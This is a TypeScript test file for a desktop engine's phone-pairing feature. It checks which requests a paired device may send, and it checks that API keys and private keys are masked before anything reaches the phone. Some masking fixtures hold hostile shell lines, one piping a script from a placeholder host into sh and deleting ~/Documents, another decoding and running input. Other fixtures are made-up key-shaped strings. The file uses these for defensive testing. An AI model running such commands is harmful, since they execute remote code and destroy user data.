// Paired devices in the engine (docs/iphone.md sections 3 to 5.7, #673), with a stand-in for pi² Remote written here.
//
// First what needs no engine: the device lists of answers.ts, with every request of the person's two lists a device
// may send named below with its reason, so that nothing reaches a phone by default; the start-up check; the readers'
// strictness; masking; and sealed items from the mailbox, checked against a real store, through a restart.
//
// Then a real engine on a throwaway data folder, whose pi² Remote is a stand-in (`PI2_REMOTE_STAND_IN`): a small
// program the engine starts as its own child, with the engine's end of a socket pair as its descriptor 3, which joins
// that socket to one this test listens on. So this test plays pi² Remote and the phone behind it, with keys of its
// own and App Attest's stand-in (`PI2_APP_ATTEST_STAND_IN`): pairing with the digits typed, one claim per window,
// attaching and resuming with both signatures, the device's table in a session, what a device is never sent, the log,
// suspension, the end of a session, revocation, and the preview switch, with which off no socket pair is made.

import assert from "node:assert/strict";
import { type ChildProcess, execFile, execFileSync, spawn } from "node:child_process";
import { createHash, createHmac, generateKeyPairSync, type KeyObject, randomBytes, sign } from "node:crypto";
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { createServer, type Socket } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { promisify } from "node:util";
import { BACKGROUND_CONTEXT as context } from "@earendil-works/chord/context";
import { createModels } from "@earendil-works/pi-ai";
import { createRegistry, Harness } from "@earendil-works/pi-durable";
import { openNodeSqliteStorage } from "@earendil-works/pi-durable/storage/sqlite/node";
import { allowsHiddenApproval, checkDeviceLists, deviceLogged, HIDDEN_FROM_THE_PHONE, deviceMay, devicePlacement, type DeviceSession, MAX_TYPED_FROM_A_DEVICE, ONLY_FROM_THE_HELPER, ONLY_ON_THE_MAC, OPEN_WITH_FACE_ID, PERSON_REQUESTS, typedRefusal } from "../src/answers.ts";
import { APPROVAL_DEPTH, checkRequestItem, type Device, deviceRequests, DeviceLog, Devices, devicesState, flushDeviceLog, fromBase64url, helperWanted, hidesSomething, LEAVE_NOT_SIGNED, logDevice, macNameNow, maskValue, NOT_A_LEAVE, NOT_KEPT, pairClaim, PART_HIDDEN, remoteHooks, revokedWatchers, shownName, summarize, TOO_DEEP, ITEM_TOO_OLD, ITEM_TOO_OLD_FACE, KEY_HIDDEN, maskKeys, maskKeysFrom, readSigned, SECOND_CLAIM, wireDevices } from "../src/devices.ts";
import type { Client } from "../src/clients.ts";
import { attachChallenge, checkAttach, offerPresenceKey, PRESENCE_BY_NEITHER_KEY, PRESENCE_KEY_ALREADY_WAITS, PRESENCE_KEY_CHANGED, PRESENCE_KEY_WAITS } from "../src/devices.ts";
import { personOnly } from "../src/answers.ts";
import { ANSWER_NOT_SENT, DEVICE_LINE_FAILED, forDevice, MAX_HELPER_LINE, MAX_LINE_TO_HELPER, MAX_PHONE_LINE, NOT_AN_ID, PICTURE_TYPES, pictureAnswer, restartWait, RUN_THAT_LASTED, SESSION_OVER, sessionLine } from "../src/remote.ts";
import { NOT_LINKED, NOT_OFFERED, TOO_MANY_PREVIEWS } from "../src/folders.ts";
import { forgetEverySecret, forgetSecrets, knowSecrets, LEAST_SECRET, RETIRED_KEPT, SECRET_HIDDEN, secretCount, secretSpans } from "../src/secrets.ts";

/** A run of base64 a picture's bytes can hold that is shaped as a key (#956): `AIza` and 35 letters and digits. */
const AIZA_RUN = `${"AIza"}SyD3noiseNoiseNoise0123456789abcdefg`;
/** `text` made a whole number of base64's four characters. */
const pad = (text: string) => text + "A".repeat((4 - (text.length % 4)) % 4);
import { offerFolders } from "../src/answers.ts";
import { SETTINGS_ONLY_IN_THE_APP } from "../src/answers.ts";
import { deviceRequestsListed, MAX_OTHER_FROM_A_DEVICE } from "../src/answers.ts";
import { PRESENTING_NOT_YET } from "../src/presented.ts";
import { DatabaseSync } from "node:sqlite";
import { EngineClient, PATIENT_MS, standInApp, stop, until } from "./patience.ts";

process.env.PI2_DEMO_TOKENS_PER_SECOND ??= "100000";
process.env.PI2_LOGIN_SHELL ??= "off";
const work = realpathSync(mkdtempSync(join(tmpdir(), "pi2-dev-")));
const KEYCHAIN_SERVICE = `dev.pi2.credentials.test-devices-${process.pid}`;
const engines: ChildProcess[] = [];
const execFileAsync = promisify(execFile);
// Stopped from outside, it still cleans up: the exit handler below runs.
process.on("SIGTERM", () => process.exit(143));
process.on("SIGINT", () => process.exit(130));
process.on("exit", () => {
	for (const child of engines) if (child.exitCode === null && child.signalCode === null) child.kill("SIGKILL");
	rmSync(work, { recursive: true, force: true });
	try {
		while (true) execFileSync("/usr/bin/security", ["delete-generic-password", "-s", KEYCHAIN_SERVICE], { stdio: "ignore" });
	} catch {
		// None left.
	}
});

function step(text: string): void {
	console.log(`ok  ${text}`);
}

// ---- The device lists (4.1, 4.2)

/**
 * Every request of FOR_THE_PERSON and FOR_THE_PERSON_SETTINGS that a device may send, with its reason as answers.ts
 * gives it and whether it widens reach: "always" (WITH_FACE_ID), "never", or "by its parameters". A new entry of
 * either list that a device's table lets through fails here until it is named, so nothing reaches a phone by default.
 */
const PERSON_REQUESTS_A_DEVICE_MAY_SEND: Record<string, [reason: string, widens: "always" | "never" | "by its parameters"]> = {
	"inbox.decide": ["an answer to an approval; always, rule, or once past a widening switch widens", "by its parameters"],
	"inbox.answer": ["an answer to an agent's question", "never"],
	"needs.answer": ["an answer under Needs you; allowing a reach request or Start anyway on a limit widens", "by its parameters"],
	"conversation.create": ["a new conversation with an agent the person has; past a limit, it widens", "by its parameters"],
	"chat.continueWithAgent": ["Continue with an Agent; with an explicit folder it is the Mac's, past a limit it widens", "by its parameters"],
	"schedules.runNow": ["running a schedule the person made; past a limit, it widens", "by its parameters"],
	"agents.allowEverything": ["turning Allow everything off narrows; on is the Mac's alone (question 5)", "never"],
	"agents.save": ["an agent's settings, as the person changes them at the Mac", "always"],
	"agents.duplicate": ["a copy with the source's reach", "always"],
	"agents.delete": ["cannot be undone", "always"],
	"agents.restore": ["puts back what was put away, with its reach", "always"],
	"agents.updateFromTemplate": ["an agent's settings from a template", "always"],
	"conversation.configure": ["a conversation's access, folder and model", "always"],
	"conversation.carryOn": ["the person's ordinary act", "never"],
	"conversation.fork": ["copies the conversation's access, agent and project", "always"],
	"conversation.retry": ["Try Again, on the same model or another the person has (4.2, two rows)", "never"],
	"conversation.archive": ["putting away narrows", "never"],
	"conversation.unarchive": ["gives an archived conversation back its access", "always"],
	"conversation.delete": ["cannot be undone", "always"],
	"chat.set": ["chat mode's settings; turning the web or memory on, or new instructions, widen", "by its parameters"],
	"memory.setEnabled": ["a memory switch turned on plants what an agent read", "always"],
	"rules.add": ["an allowed command", "always"],
	"rules.remove": ["removing an allowed command narrows", "never"],
	"schedules.save": ["schedules start work with nobody there", "always"],
	"schedules.delete": ["deleting a schedule narrows", "never"],
	"coauthor.set": ["the person's ordinary act", "never"],
	"projects.create": ["a new project; with a folder only one the Mac offered (projects.folders), by its exact text; with a template it copies an agent, which widens", "by its parameters"],
	"projects.set": ["the switches of 8.1 and the limits", "always"],
	"projects.archive": ["putting away narrows", "never"],
	"projects.unarchive": ["puts back what was put away, with its reach", "always"],
	"projects.delete": ["cannot be undone", "always"],
	"projects.restoreConversation": ["its dry run reads; restoring puts back what was put away, with its reach, which widens", "by its parameters"],
	"projects.startFresh": ["the person's ordinary act", "never"],
	"projects.setOrchestrator": ["the orchestrator's role carries its switches and tools", "always"],
	"projects.watch": ["reading: it chooses which of a project's tabs this session watches, and attaches nothing (decision 27)", "never"],
	"projects.addAgent": ["making an agent", "always"],
	"projects.rules.add": ["the person's ordinary act", "never"],
	"projects.rules.edit": ["a project's rules", "always"],
	"projects.rules.move": ["a project's rules", "always"],
	"projects.rules.remove": ["a project's rules", "always"],
	"changes.undo": ["undo can restore what the person narrowed", "always"],
	"work.create": ["filing work, as the person does on the board", "never"],
	"work.act": ["what the person does by hand on the board; it merges nothing (4.2); past a limit, it widens", "by its parameters"],
	"worktree.create": ["the person's ordinary act", "never"],
	"worktree.remove": ["cannot be undone", "always"],
	"github.attach": ["a repository attached", "always"],
	"github.detach": ["detaching narrows", "never"],
	"github.merge": ["a merge, as the person merges at the Mac", "always"],
	"github.sendBack": ["the person's ordinary act", "never"],
	"github.settle": ["the person's answer to a write whose outcome is unknown; Not done lets the write be made again, which widens", "by its parameters"],
	"usage.setBudget": ["raising the budget unbinds spending", "always"],
	"settings.setCompaction": ["the person's ordinary act", "never"],
	"settings.setAutoArchive": ["the person's ordinary act", "never"],
	"settings.setAwake": ["the person's ordinary act", "never"],
	"recovery.dismiss": ["a notice dismissed", "never"],
	"limits.dismiss": ["a notice dismissed", "never"],
};

{
	const relay: DeviceSession = { path: "relay", approvalSwitch: () => null, approvalHidden: () => false };
	const sent = PERSON_REQUESTS.filter((method) => devicePlacement(method)?.list !== "MAC_ONLY");
	assert.deepEqual([...sent].sort(), Object.keys(PERSON_REQUESTS_A_DEVICE_MAY_SEND).sort(), "every person's request a device may send is named here");
	for (const [method, [reason, widens]] of Object.entries(PERSON_REQUESTS_A_DEVICE_MAY_SEND)) {
		const placed = devicePlacement(method)!;
		assert.equal(placed.why, reason, `${method}'s reason`);
		assert.equal(placed.list, widens === "always" ? "WITH_FACE_ID" : "FROM_A_DEVICE", `${method}'s list`);
		if (widens === "always") assert.equal(deviceMay(method, {}, relay), "face", method);
		if (widens === "never") assert.notEqual(deviceMay(method, { on: false, folder: null, dryRun: true }, relay), "face", method);
	}
	for (const method of PERSON_REQUESTS) assert.ok(devicePlacement(method)!.why.length > 0, `${method} has a reason`);
	step(`the ${sent.length} requests of the person's lists a device may send are each named, with the reason and whether it widens`);

	const switchOf = (name: string | null): DeviceSession => ({ path: "relay", approvalSwitch: () => name as never, approvalHidden: () => false });
	assert.equal(deviceMay("agents.allowEverything", { id: "a", on: true }, relay), "no", "Allow everything on is the Mac's alone");
	assert.equal(deviceMay("agents.allowEverything", { id: "a", on: false }, relay), "yes");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "once" }, relay), "yes");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "deny" }, switchOf("merge")), "yes");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "once" }, switchOf("startAgents")), "yes");
	for (const name of ["merge", "release", "passLimits", "makeAgents", "addRules"]) assert.equal(deviceMay("inbox.decide", { id: "x", decision: "once" }, switchOf(name)), "face", name);
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "always" }, relay), "face");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "rule" }, relay), "face");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "sideways" }, relay), "no");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "reach", allow: true } }, relay), "face");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "reach", allow: false } }, relay), "yes");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "limit", start: true } }, relay), "face");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "limit", start: false } }, relay), "yes");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "approval", decision: "once" } }, switchOf("release")), "face");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "question", text: "y" } }, relay), "yes");
	// An approval the phone was not shown whole: no allowing answer from it, by the engine's own record; denying stays.
	const hidden: DeviceSession = { path: "relay", approvalSwitch: () => null, approvalHidden: (id) => id === "masked" };
	for (const decision of ["once", "always", "rule"]) {
		assert.equal(deviceMay("inbox.decide", { id: "masked", decision }, hidden), "no", decision);
		assert.equal(deviceMay("needs.answer", { id: "masked", answer: { kind: "approval", decision } }, hidden), "no", decision);
	}
	assert.equal(deviceMay("inbox.decide", { id: "masked", decision: "deny" }, hidden), "yes");
	assert.equal(deviceMay("needs.answer", { id: "masked", answer: { kind: "approval", decision: "deny" } }, hidden), "yes");
	assert.equal(deviceMay("inbox.decide", { id: "shown", decision: "once" }, hidden), "yes");
	assert.ok(allowsHiddenApproval("inbox.decide", { id: "masked", decision: "once" }, hidden) && !allowsHiddenApproval("inbox.decide", { id: "masked", decision: "deny" }, hidden));
	assert.equal(deviceMay("conversation.create", { confirmLimit: "r" }, relay), "face");
	assert.equal(deviceMay("chat.continueWithAgent", { id: 1, cwd: "/tmp" }, relay), "no", "an explicit folder is the Mac's");
	assert.equal(deviceMay("github.settle", { happened: false }, relay), "face");
	assert.equal(deviceMay("chat.set", { memory: false }, relay), "yes");
	assert.equal(deviceMay("chat.set", { instructions: "x" }, relay), "face");
	assert.equal(deviceMay("projects.create", { folder: "/Users" }, relay), "no", "a folder the Mac has not offered (#698)");
	offerFolders(["/x/offered"]);
	assert.equal(deviceMay("projects.create", { folder: "/x/offered" }, relay), "yes", "one it offered, by its exact text");
	assert.equal(deviceMay("projects.create", { folder: "/x/offered/" }, relay), "no", "and by no other text for it");
	assert.equal(deviceMay("projects.create", { folder: "/x/offered", template: "forge" }, relay), "face");
	offerFolders([]);
	assert.equal(deviceMay("projects.create", { folder: null }, relay), "yes");
	assert.equal(deviceMay("projects.create", { folder: null, template: "forge" }, relay), "face", "a template copies an agent with its reach, as agents.duplicate does");
	for (const method of ["providers.setKey", "variables.set", "mcp.save", "devices.pairStart", "devices.pairConfirm", "devices.set", "remote.attach", "test-copy.answerer", "settings.setAgentDefault", "no.such"]) {
		assert.equal(deviceMay(method, {}, relay), "no", method);
	}
	const mailbox: DeviceSession = { path: "mailbox", approvalSwitch: () => null, approvalHidden: () => false };
	assert.equal(deviceMay("submit", { id: 1, text: "hi" }, mailbox), "yes");
	assert.equal(deviceMay("submit", { id: 1, text: "é".repeat(4_000) }, mailbox), "yes", "4,000 characters, not bytes");
	assert.equal(deviceMay("submit", { id: 1, text: "x".repeat(4_001) }, mailbox), "no");
	assert.equal(deviceMay("submit", { id: 1, text: "hi", attachments: [] }, mailbox), "no", "text only");
	assert.equal(deviceMay("abort", { id: 1 }, mailbox), "yes");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "always" }, mailbox), "face");
	assert.equal(deviceMay("github.merge", {}, mailbox), "no", "a change that widens needs a channel");
	assert.equal(deviceMay("engine.info", {}, mailbox), "no", "reading needs a channel");
	assert.equal(deviceLogged("engine.info", {}), false, "reading is not logged");
	assert.equal(deviceLogged("conversation.export", {}), true, "an export is");
	assert.equal(deviceLogged("projects.restoreConversation", { dryRun: true }), false);
	assert.equal(deviceLogged("projects.restoreConversation", {}), true);
	assert.equal(deviceLogged("projects.folders", {}), false, "the folders offered are reading");
	assert.equal(deviceLogged("files.preview", {}), true, "a file shown is logged, since it copies a file out");
	step("the table: Allow everything on, secrets, programs, pairing and remote.* stay the Mac's; answers widen by what they allow; the mailbox takes its rows alone");

	assert.throws(() => checkDeviceLists(["engine.info", "made.up"], []), /made\.up belongs to 0 device lists/);
	assert.throws(() => checkDeviceLists(["engine.info"], ["remote.made.up"]), /remote\.made\.up is a handler of pi² Remote's connection, and is not in FOR_THE_HELPER/);
	assert.throws(() => checkDeviceLists(["remote.attach"], []), /remote\.attach belongs to 0 device lists[\s\S]*FOR_THE_HELPER/);
	assert.throws(() => checkDeviceLists(["engine.info"], [], [new Set(["engine.info"]), new Set(["engine.info"])]), /engine\.info belongs to 2 device lists/);
	assert.throws(() => checkDeviceLists(["engine.info"], [], [new Set(["engine.info", "files.preview"])], new Set()), /files\.preview is in a device list and has no handler/);
	assert.throws(() => checkDeviceLists(["engine.info"], [], [new Set(["engine.info"])], new Set(["remote.mailboxIn"])), /remote\.mailboxIn is in FOR_THE_HELPER and has no handler/);
	assert.doesNotThrow(() => checkDeviceLists(["engine.info"], ["remote.attach"], [new Set(["engine.info", "test-copy.fill"])], new Set(["remote.attach"])), "a test copy's own request may be absent");
	step("the start-up check refuses a handler in no device list, in two, or pi² Remote's anywhere else, and a name placed with no handler");

	// A new Face ID key (#786): only the Mac accepts or refuses one; the offer is pi² Remote's alone.
	for (const method of ["devices.acceptPresenceKey", "devices.refusePresenceKey"]) {
		assert.equal(devicePlacement(method)?.list, "MAC_ONLY", method);
		for (const path of ["relay", "home", "direct", "mailbox"] as const) assert.equal(deviceMay(method, { device: "dev_x" }, { ...relay, path }), "no", `${method} by ${path}`);
	}
	assert.equal(devicePlacement("remote.presenceKey")?.list, "FOR_THE_HELPER");
	for (const method of ["devices.acceptPresenceKey", "devices.refusePresenceKey"]) assert.ok(personOnly(method, { device: "dev_x" }) !== undefined, `${method} on the socket is the app's alone`);
	assert.equal(deviceMay("remote.presenceKey", {}, relay), "no");
	step("a new Face ID key is accepted or refused on the Mac alone, by any path, and offered through pi² Remote alone");

	// Presenting's requests (#963, design/presenting.md): a phone reads presented.picture alone, as conversation.image,
	// with a channel and unlogged; the app's host role, the network switch, the window's list and a page's files are
	// the Mac's by every path. On the socket, the host role and the switch are the app's alone, the three reads open.
	const picture = { id: 1, presentation: "p", version: 1, item: 0 };
	assert.deepEqual(devicePlacement("presented.picture"), { list: "FROM_A_DEVICE", why: "reading: a picture an agent presented, or a page's snapshot, as conversation.image is (#946)" });
	for (const path of ["relay", "home", "direct"] as const) assert.equal(deviceMay("presented.picture", picture, { ...relay, path }), "yes", `presented.picture by ${path}`);
	assert.equal(deviceMay("presented.picture", picture, { ...relay, path: "mailbox" }), "no", "reading needs a channel");
	assert.equal(deviceLogged("presented.picture", picture), false, "reading is not logged");
	assert.equal(personOnly("presented.picture", picture), undefined);
	const presentingMacOnly = { "present.register": "the app's host role", "present.drawn": "the app's host role", "presented.list": "presenting's window, the Mac's for now", "presented.file": "a presented page's files, the Mac's for now", "presented.network": "a presented page's network switch, the person's setting at the Mac" };
	for (const [method, why] of Object.entries(presentingMacOnly)) {
		assert.deepEqual(devicePlacement(method), { list: "MAC_ONLY", why }, method);
		for (const path of ["relay", "home", "direct", "mailbox"] as const) {
			for (const params of [{}, { ...picture, path: "index.html", allow: true, ok: true, requestId: "r" }]) assert.equal(deviceMay(method, params, { ...relay, path }), "no", `${method} by ${path}`);
		}
	}
	for (const method of ["present.register", "present.drawn", "presented.network"]) assert.equal(personOnly(method, { ...picture, allow: false }), SETTINGS_ONLY_IN_THE_APP, `${method} on the socket is the app's alone`);
	for (const method of ["presented.list", "presented.file"]) assert.equal(personOnly(method, picture), undefined, `${method} on the socket is open to any, as reading`);
	step("presenting's requests: a phone may send presented.picture alone, with a channel, as reading; the other five are the Mac's by every path, and three the app's alone on the socket");
}

// ---- Readers, masking, what a device is sent

{
	assert.ok(readSigned('{"v":2,"kind":"pair"}', ["v", "kind"]));
	for (const text of ['{"v":2, "kind":"pair"}', '{"v":2,"kind":"pair"} ', '{"kind":"pair","v":2}', '{"v":2,"kind":"pair","x":1}', '{"v":2,"v":2,"kind":"pair"}', '{"v":2.0,"kind":"pair"}', '{"v":2,"kind":"p\\u0061ir"}', "[2]"]) {
		assert.equal(readSigned(text, ["v", "kind"]), null, text);
	}
	assert.ok(fromBase64url("AAEC", 3));
	for (const text of ["AAEC=", "AA+C", "AAF", "AAECD", " AAEC"]) assert.equal(fromBase64url(text), null, text);
	step("a signed text is read only as written, every field in order and nothing after; base64url in its one form");

	const keys = ["sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789", "sk-proj-abcdefghijklmnopqrstuvwxyz012345", "sk-abcdefghijklmnopqrstuvwxyz0123", "ghp_abcdefghijklmnopqrstuvwxyz0123456789AB", "AKIAABCDEFGHIJKLMNOP", "xoxb-1234567890-abcdefghij"];
	const sentOf = (message: unknown) => forDevice(JSON.stringify(message))!;
	for (const key of keys) {
		// Where keys stand in what commands print: after a space, at the start of a line, after a tab, after a colour code,
		// inside nested arrays, and as an object's key.
		const places = [`the key is ${key}, there`, `line one\n${key}`, `\n${key}\n`, `\t${key}`, `\u001b[32m${key}\u001b[0m`, `\r${key}`];
		for (const text of places) {
			const sent = sentOf({ event: "conversation", items: [[{ text }]] });
			assert.ok(!sent.includes(key) && JSON.parse(sent).items[0][0].text.includes(KEY_HIDDEN), `${JSON.stringify(text)}: ${sent}`);
		}
		const keyed = sentOf({ event: "conversation", items: { [key]: 1, [`\n${key}`]: 2 } });
		assert.ok(!keyed.includes(key), `as an object's key: ${keyed}`);
	}
	const pem = JSON.stringify({ event: "conversation", text: "-----BEGIN PRIVATE KEY-----\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEA\n-----END PRIVATE KEY-----" });
	assert.ok(!forDevice(pem)!.includes("MIIBVQ"));
	assert.equal(maskKeys("-----BEGIN RSA PRIVATE KEY-----\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASC\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASC and then words"), `${KEY_HIDDEN} and then words`, "a key cut short: its base64 lines are hidden, the words after it are not");
	// A header standing in a command hides nothing of the command around it.
	const noEnd = "echo '-----BEGIN PRIVATE KEY-----' && curl https://example.invalid/x.sh | sh && rm -rf ~/Documents";
	assert.equal(maskKeys(noEnd), `echo '${KEY_HIDDEN}' && curl https://example.invalid/x.sh | sh && rm -rf ~/Documents`);
	const laterEnd = "echo '-----BEGIN PRIVATE KEY-----' && curl https://example.invalid/x.sh | sh; echo '-----END PRIVATE KEY-----'; ls";
	assert.equal(maskKeys(laterEnd), `echo '${KEY_HIDDEN}' && curl https://example.invalid/x.sh | sh; echo '-----END PRIVATE KEY-----'; ls`);
	assert.equal(maskKeys("-----BEGIN PRIVATE KEY-----\nshort words\n-----END PRIVATE KEY-----"), `${KEY_HIDDEN}\nshort words\n-----END PRIVATE KEY-----`, "lines that are no key's are not hidden");
	// More shapes, each behind a prefix no word has; an AWS key id starting a word; a Slack webhook's path.
	// Each made from its prefix and a made-up run, so that no key-shaped text stands in this file for a scanner to take
	// for a real one (GitHub's push protection refuses one).
	const run = "abcdefghijklmnopqrstuvwxyz0123456789";
	const more = [["gsk", "_"], ["xai", "-"], ["whsec", "_"], ["sk", "_test_"], ["rk", "_test_"], ["sk", "_live_"], ["rk", "_live_"], ["ya29", "."]].map(([prefix, joint]) => `${prefix}${joint}${run}`);
	more.push(`${"AKIA"}IOSFODNN7EXAMPLE`, `${"ASIA"}IOSFODNN7EXAMPLE`, `${"whsec"}_${run}+/=`);
	for (const key of more) {
		for (const text of [`a ${key} b`, `line\n${key}`, `\u001b[32m${key}`]) assert.ok(!maskKeys(text).includes(key) && maskKeys(text).includes(KEY_HIDDEN), `${JSON.stringify(text)}: ${maskKeys(text)}`);
	}
	assert.equal(maskKeys("xAKIAIOSFODNN7EXAMPLE"), "xAKIAIOSFODNN7EXAMPLE", "an AWS key id starts a word");
	assert.equal(maskKeys("post to https://hooks.slack.com/services/T000/B000/XXXXXXXXXXXXXXXX now"), `post to https://hooks.slack.com/services/${KEY_HIDDEN} now`);
	assert.equal(maskKeys("a desk-chair and sk-short words"), "a desk-chair and sk-short words", "words are left as they are");
	// But for a text that ends partway into what may be a key (#997).
	assert.equal(maskKeys("a desk-chair and sk-short"), `a desk-chair and ${KEY_HIDDEN}`, "a text that ends after a key's prefix");
	// Names as a phone shows them (RemoteKit's ShownText): stripped, cut to 128 bytes between characters, or "Mac".
	assert.equal(shownName("Kim\u200D's\u202E Mac", "Mac"), "Kim's Mac");
	assert.equal(shownName("\u200B\u202E\u2066\uFEFF \u0007", "Mac"), "Mac");
	const emoji = shownName("\u{1F469}\u200D\u{1F4BB}".repeat(40), "Mac");
	assert.ok(Buffer.byteLength(emoji) <= 128 && Buffer.from(emoji).toString() === emoji && !emoji.includes("\u200D"), emoji);
	// Half a character, which a Swift string cannot hold (#881); a whole one of two halves stays.
	assert.equal(shownName("Kim\uD800's \uDC00iPhone \u{1F4F1}", "iPhone"), "Kim's iPhone \u{1F4F1}");
	assert.equal(shownName("\uDFFF\uD83D", "iPhone"), "iPhone");
	const proto = forDevice('{"id":1,"result":{"__proto__":{"polluted":1}}}')!;
	assert.ok(proto.includes('"__proto__":{"polluted":1}') && ({} as { polluted?: number }).polluted === undefined, "a key __proto__ stays a key");
	// A long run after a key's prefix: masked whole, at once, and nothing thrown (a greedy pattern overflowed V8's stack).
	const long = `${"sk-"}${"a".repeat(8 * 1024 * 1024)}`;
	const began = performance.now();
	const sentLong = sentOf({ event: "conversation", text: `x ${long} y`, other: `ghp_${"b".repeat(8 * 1024 * 1024)}` });
	assert.equal(JSON.parse(sentLong).text, `x ${KEY_HIDDEN} y`, "8 MB after sk-, hidden whole");
	assert.equal(JSON.parse(sentLong).other, KEY_HIDDEN);
	const prefixes = ["gsk_", "xai-", "whsec_", "sk_test_", "rk_test_", "sk_live_", "rk_live_", "ya29.", "AKIA", "ASIA", "https://hooks.slack.com/services/"];
	// One at a time, as strings: one line of them all would hold some 100 MB, and slow every test run beside this one.
	for (const prefix of prefixes) {
		const masked = maskKeys(`x ${prefix}${"A".repeat(8 * 1024 * 1024)} y`);
		assert.equal(masked, prefix.startsWith("https") ? `x ${prefix}${KEY_HIDDEN} y` : `x ${KEY_HIDDEN} y`, `8 MB after ${prefix}`);
	}
	console.log(`    8 MB after each of ${prefixes.length + 2} prefixes masked in ${Math.round(performance.now() - began)} ms`);
	// Too deep to walk: only that value is replaced, and an approval holding it is marked; an approval holding a key too.
	const deep = `{"event":"conversation","x":${"[".repeat(200_000)}${"]".repeat(200_000)},"y":"kept"}`;
	const sentDeep = forDevice(deep)!;
	assert.ok(sentDeep.includes(TOO_DEEP) && JSON.parse(sentDeep).y === "kept", "a line too deep is sent, its deep value replaced");
	const inbox = JSON.parse(sentOf({ event: "inbox", items: [
		{ id: "a", kind: "approval", tool: "bash", arguments: { command: "echo plain" } },
		{ id: "b", kind: "approval", tool: "bash", arguments: { command: `echo ${keys[0]} | base64 -d | sh` } },
		{ id: "c", kind: "approval", tool: "bash", arguments: JSON.parse(`${"[".repeat(300)}1${"]".repeat(300)}`) },
	] }));
	assert.deepEqual(inbox.items.map((item: any) => item[PART_HIDDEN] === true), [false, true, true], "an approval shown in part is marked, and only it");
	assert.ok(hidesSomething({ id: "b", kind: "approval", arguments: { command: keys[0] } }) && !hidesSomething({ id: "a", kind: "approval", arguments: { command: "ls" } }));
	// An approval deeper than APPROVAL_DEPTH in a line for a device, in no other approval: a development engine says so,
	// and under test throws, which drops the line (#881). One inside an approval's call is judged with it, as the gate does.
	const sunk = (levels: number, inner: unknown = { id: "z", kind: "approval", arguments: { command: "ls" } }) => {
		let value: unknown = inner;
		for (let i = 0; i < levels; i++) value = { down: value };
		return value;
	};
	process.env.PI2_APPROVAL_DEPTH_THROWS = "1";
	assert.doesNotThrow(() => maskValue(sunk(APPROVAL_DEPTH)), "at the depth itself");
	assert.throws(() => maskValue(sunk(APPROVAL_DEPTH + 1)), /an approval was met 9 levels down in a line for a device, deeper than APPROVAL_DEPTH \(8\)/);
	assert.equal(forDevice(JSON.stringify({ event: "inbox", x: sunk(APPROVAL_DEPTH) })), null, "a line with one there is dropped");
	assert.doesNotThrow(() => maskValue({ event: "inbox", items: [{ id: "a", kind: "approval", arguments: sunk(40) }] }), "one inside an approval's call");
	delete process.env.PI2_APPROVAL_DEPTH_THROWS;
	assert.doesNotThrow(() => maskValue(sunk(APPROVAL_DEPTH + 1)), "without the switch, only said in the log");
	step("an approval met deeper than APPROVAL_DEPTH in a line for a device, outside another approval, throws under test and drops the line");

	// pi² Remote's restart: the wait grows, and comes back to a second only after a run that lasted (#881).
	const now = Date.now();
	assert.deepEqual(restartWait(1_000, {}, now), { wait: 1_000, next: 2_000 }, "a pi² Remote that never said hello");
	assert.deepEqual(restartWait(2_000, { helloAt: now - 5_000 }, now), { wait: 2_000, next: 4_000 }, "a hello alone does not bring the wait back");
	assert.deepEqual(restartWait(16_000, { helloAt: now - RUN_THAT_LASTED }, now), { wait: 1_000, next: 2_000 }, "a run that lasted does");
	assert.deepEqual(restartWait(16_000, { helloAt: now - 10 * RUN_THAT_LASTED, overCap: true }, now), { wait: 16_000, next: 32_000 }, "a stop for a line over the cap never does");
	assert.deepEqual(restartWait(60_000, { helloAt: now }, now), { wait: 60_000, next: 60_000 }, "a minute at most");
	step("pi² Remote's restart waits twice as long each time, up to a minute, and a second again only after a run of a minute not stopped for its line");
	assert.equal(forDevice("not JSON"), null);
	// An answer that cannot be made fit is answered with an error, never with nothing.
	assert.equal(forDevice('{"id":7,"result":{"cut short'), `{"id":7,"error":${JSON.stringify(ANSWER_NOT_SENT)}}`);
	assert.equal(forDevice('{"id":"r-1","result":'), `{"id":"r-1","error":${JSON.stringify(ANSWER_NOT_SENT)}}`);
	for (const event of ["computer", "browser", "auth", "local", "local.progress", "local.running", "mcp", "devices", "remote", "pictures", "priority", "made.up"]) {
		assert.equal(forDevice(JSON.stringify({ event, anything: 1 })), null, event);
		assert.equal(forDevice(JSON.stringify({ other: 1, event })), null, `${event}, not first`);
		assert.equal(forDevice(JSON.stringify({ id: 1, event, result: {} })), null, `${event}, after an id`);
	}
	assert.equal(forDevice(JSON.stringify({ id: 1 })), null, "an id alone is no answer");
	assert.equal(forDevice(JSON.stringify({ event: 7 })), null);
	const providers = JSON.parse(forDevice(JSON.stringify({ event: "providers", providers: [{ id: "box", endpoint: { id: "box", name: "Box", baseUrl: "https://h/v1?token=t0p", api: "x", models: [] }, ask: { can: true, url: "https://h" } }] }))!);
	assert.deepEqual(providers.providers[0].endpoint, { id: "box", name: "Box" });
	assert.deepEqual(providers.providers[0].ask, { can: true, url: null });
	assert.equal(forDevice('{"id":3,"result":{"key":"sk-ant-api03-abcdefghijklmnopqrstuvwxyz"}}'), `{"id":3,"result":{"key":"${KEY_HIDDEN}"}}`);
	step("what a device is sent: only the events named for it, endpoints by name only, and no key-shaped string wherever it stands; a line that cannot be masked is dropped");
}

// ---- The values of the secrets the engine knows (#894): masked wherever they stand, as a key's shape is

{
	const sentOf = (message: unknown) => forDevice(JSON.stringify(message))!;
